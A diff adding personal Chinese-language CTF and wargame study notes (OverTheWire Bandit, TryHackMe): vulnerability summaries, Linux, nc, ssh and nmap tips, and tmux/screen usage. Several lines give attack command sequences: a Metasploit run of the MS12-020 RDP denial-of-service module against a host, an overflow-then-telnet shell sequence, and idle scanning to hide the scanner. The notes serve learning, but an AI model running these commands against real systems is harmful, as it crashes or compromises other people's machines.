@@ -1,0 +1,123 @@
+ctf 
+
+
+https://overthewire.org/wargames/bandit/
+
+https://tryhackme.com/hacktivities?tab=search
+CTF collection Vol.1
+OhSINT
+
+
+常见漏洞
+
+缓冲区溢出：
+缓冲区溢出中，最为危险的是堆栈溢出，因为入侵者可以利用堆栈溢出，在函数返回时改变返回程序的地址，让其跳转到任意地址，带来的危害是：一种情况是程序崩溃导致拒绝服务，另外一种就是跳转并且执行一段恶意代码，比如得到shell，然后为所欲为。
+
+MS12-020漏洞：
+操作系统的远程桌面协议存在重大漏洞，入侵者（黑客）可以通过向远程桌面默认端口（3389）发一系列特定RDP包，从而获取超级管理员权限，进而入侵系统。
+防护：防护过程中最重要的就是开启自动更新，接受microsoft的更新。
+
+
+工具：
+Metasploit工具：开源的安全漏洞检测工具，攻击工具开发平台
+Metasploit console:
+msf > db_nmap -sT -p3389  10.1.1.2   收集目标主机信息，是否开放3389端口(windows远程桌面)
+msf > use auxiliary/dos/windows/rdp/ms12_020_maxchannelids  利用ms12_020漏洞对目标主机进行攻击
+show options
+set rhost 10.1.1.2
+exploit 利用该命令查看攻击结果
+ping 10.1.1.2 目标主机已经瘫痪
+
+
+dns
+扫描目标主机
+dns -s 10.1.1.2 扫描目标主机端口
+对目标主机进行溢出
+dns -t 2003chs 10.1.1.2 1027 （上一条命令扫出来的端口）
+连接
+telnet 10.1.1.2 1100 连接
+
+查看目标主机信息
+ipconfig /all 
+
+
+如何查看名为 - 的文件 给出文件的路径：如 cat ./-
+
+统计各行出现的次数：sort data.txt | uniq -c/u
+先排序，-c显示行数，-u显示出现一次的行
+
+rot13加解密：tr 'A-Za-z' 'N-ZA-Mn-za-m' <<< "plan/cipher text"
+
+find / -user pillow
+find / -size 100c
+
+二进制文件转换16进制
+xxd f.bin hex.txt （或 hexdump -C f.bin 查看）
+16进制转回二进制
+xxd -r hex.txt f.bin
+
+ssh私钥登陆
+ssh bandit14@bandit.labs.overthewire.org -p 2220 -i /Users/alonglamp/sshkey.private
+或
+ ssh -v bandit14@bandit.labs.overthewire.org -p 2220 
+ 私钥文件放在 ~/.ssh目录下名为 id_rsa 赋600权限
+ https://help.ubuntu.com/community/SSH/OpenSSH/Keys
+
+ linux no-login 登陆
+ su user
+ ssh -t root@ip -p prot /bin/sh
+
+
+nc发送接收tcp/udp
+tcp:
+server: nc -v -l 8888
+client: nc -v 127.0.0.1 8888
+例：发送接收文件：server：nc -v -l 8888 > xxxdriver client: nc 39.96.89.236 8888 < chromedriver 
+udp:
+server: nc -vu -l 8888
+client: nc -vu 127.0.0.1 8888
+
+连接openssl客户端
+openssl s_client -crlf -ign_eof -connect localhost:30001
+SSL/TLS:
+https://en.wikipedia.org/wiki/Transport_Layer_Security#SSL_1.0,_2.0,_and_3.0
+test-openssl-tls:
+https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
+
+
+扫描端口：
+nmap 127.0.0.1 -p80 扫描指定端口
+nmap 127.0.0.1 -p 31000-32000 扫描端口范围
+nmap -sS 127.0.0.1 使用TCP的SYN进行扫描，半开放扫描不建立完整连接
+nmap -sT 127.0.0.1 使用TCP进行扫描--默认
+nmap -sU 127.0.0.1  使用UDP进行扫描
+nmap -sF 127.0.0.1 使用FIN扫描
+nmap -sI  192.168.3.227 127.0.0.1 idle扫描，让另一台帮你扫描隐藏自己
+nmap -sV 127.0.0.1 获取服务器版本详细信息
+nmap -O 127.0.0.1 确定主机操作系统
+
+多窗口
+screen -S a1  给会话命名
+ctrl+a w 列出当前所有窗口
+ctrl+a d 挂起会话
+screen -ls 列出挂起的会话
+screen -r a1 重连会话
+screen -x 共享会话
+
+tmux new -s a2
+ctrl + b c 在当前会话下再创建一个窗口
+ctrl + b 1 切换到1窗口  *号为活动窗口
+ctrl + b d 挂起窗口
+tmux ls 查看会话
+tmux a -t a2 恢复会话
+
+watch n 2 free 监听free每2秒执行一次
+
+unix job
+jobs 查看
+ctrl + z 挂起job,暂停
+bg %job_num 让挂起的job在后台继续运行
+fg %job_num 将后台job移至前台
+ctrl + c 或 kill %job_num 结束job(挂起job后)
+
+
